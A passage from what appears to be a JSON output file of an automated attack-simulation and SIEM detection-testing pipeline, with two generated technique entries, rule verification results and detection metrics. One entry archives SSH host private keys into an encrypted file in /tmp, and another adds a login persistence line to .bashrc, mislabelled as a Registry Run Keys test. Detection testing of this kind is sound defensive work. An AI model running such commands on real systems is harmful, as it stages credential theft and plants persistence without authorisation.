      "command": "7z a -t7z -mhe=on -p\"StrongPass!2025\" /tmp/secure_data.7z /etc/ssh/ssh_config /etc/ssh/ssh_host_*",
      "description": "Uses 7\u2011Zip to create an AES\u2011256 encrypted 7z archive of SSH configuration files, stored in /tmp.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "An encrypted archive named secure_data.7z appears in /tmp, containing the specified SSH files.",
      "source": "langchain",
      "generated_at": "2025-12-26T07:00:17.443112",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "16381332-f459-4cf1-b73f-aba17dfc5173",
      "ttp_id": "1c511ebf-3c3d-4699-9a24-67c640dc2507",
      "technique_id": "1c511ebf-3c3d-4699-9a24-67c640dc2507",
      "technique_name": "Registry Run Keys",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "echo '# Persistence test: run benign command at login' >> \"$HOME/.bashrc\" && echo 'echo \"Persistence test executed\"' >> \"$HOME/.bashrc\"",
      "description": "Appends a harmless echo command to the user's .bashrc so it runs each time an interactive bash session starts, mimicking a Run Key persistence entry at user level.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "When the user opens a new terminal or logs in, the added echo line will execute and print \"Persistence test executed\" to the console.",
      "source": "langchain",
      "generated_at": "2025-12-26T06:55:37.119257",
      "agent_id": "a4a7009e-c1a1-4d25-942c-98dd10310f45",
      "confidence_score": 0.623,
      "validated": true
    }
  ],
  "siem_verification": [
    {
      "rule_id": "c1a20ecc-42e9-479f-9889-d67903a8ea10",
      "ttp_id": "T1059.001",
      "detected": true,
      "events_found": 54,
      "query_time_ms": 623.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "3c2af4f5-c2d0-4476-a2c0-0140e16665dc",
      "ttp_id": "T1086",
      "detected": true,
      "events_found": 58,
      "query_time_ms": 952.0000000000001,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "a53951d0-2c6d-4fc9-b64b-35f61c3c0b5e",
      "ttp_id": "T1190",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 721.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "44052d86-c331-4c91-810e-01f90be99582",
      "ttp_id": "T1204",
      "detected": true,
      "events_found": 56,
      "query_time_ms": 506.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "5a5e8891-c242-4488-aba7-c80510497a21",
      "ttp_id": "T1090",
      "detected": true,
      "events_found": 52,
      "query_time_ms": 567.0000000000001,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "5e3fc185-e26f-4a09-8cf4-affe4f07e4d1",
      "ttp_id": "T1021",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 631.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "370b7b3b-9db3-4b86-b78c-143d3858579e",
      "ttp_id": "T1033",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 0,
      "status": "error",
      "message": "Invalid SPL: Unbalanced quotes."
    },
    {
      "rule_id": "2ac52ac7-2679-4abb-b466-cea3207ca9a2",
      "ttp_id": "T1071",
      "detected": true,
      "events_found": 16,
      "query_time_ms": 713.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "8f2021de-e3aa-4282-922c-f7deba414945",
      "ttp_id": "T1082",
      "detected": true,
      "events_found": 52,
      "query_time_ms": 712.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "8c8e3ad2-2f8b-4203-85f1-cf9adff6c990",
      "ttp_id": "T1005",
      "detected": true,
      "events_found": 2,
      "query_time_ms": 699.0000000000001,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "990324b6-5202-4629-a318-e3d8cd7d0425",
      "ttp_id": "T1046",
      "detected": true,
      "events_found": 12,
      "query_time_ms": 574.0000000000001,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "f5ec9fc7-5efe-49b1-89dd-509d1f067da1",
      "ttp_id": "T1543",
      "detected": true,
      "events_found": 70,
      "query_time_ms": 640.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "f36023f7-549c-478b-b1b8-0c19e80aea0f",
      "ttp_id": "T1059",
      "detected": true,
      "events_found": 58,
      "query_time_ms": 595.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "ea01f78a-778c-4f55-97ee-761e6176d80c",
      "ttp_id": "T1027",
      "detected": true,
      "events_found": 46,
      "query_time_ms": 607.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "bfedfaa6-6526-4fa2-a742-b3f7d84339fe",
      "ttp_id": "T1041",
      "detected": true,
      "events_found": 193,
      "query_time_ms": 688.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "89fe07e1-595f-453e-a73e-1b405949f0a5",
      "ttp_id": "T1560",
      "detected": true,
      "events_found": 16,
      "query_time_ms": 645.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "7e0c1a4a-2006-461f-8475-06805c27b870",
      "ttp_id": "T1547.001",
      "detected": true,
      "events_found": 50,
      "query_time_ms": 583.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    }
  ],
  "siem_metrics": {
    "true_positives": 14,
    "false_positives": 0,
    "false_negatives": 3,
    "precision": 1.0,
    "detection_rate": 0.8235294117647058,
    "f1_score": 0.9032258064516129
  },
  "iterations": 1,
  "final_score": 0.6432352941176472,
  "final_report": {
    "total_ttps": 20,
    "optimized_ttps": 17,
    "generated_rules": 17,
    "generated_attacks": 82,
    "timestamp": "2025-12-26T14:07:49.086805"
  },
  "timestamp": "2025-12-26T14:07:49.087638",
  "benchmark_metrics": {
    "duration_s": 868.4382646083832,
    "quality_score": 0.6660909851745576
  }
}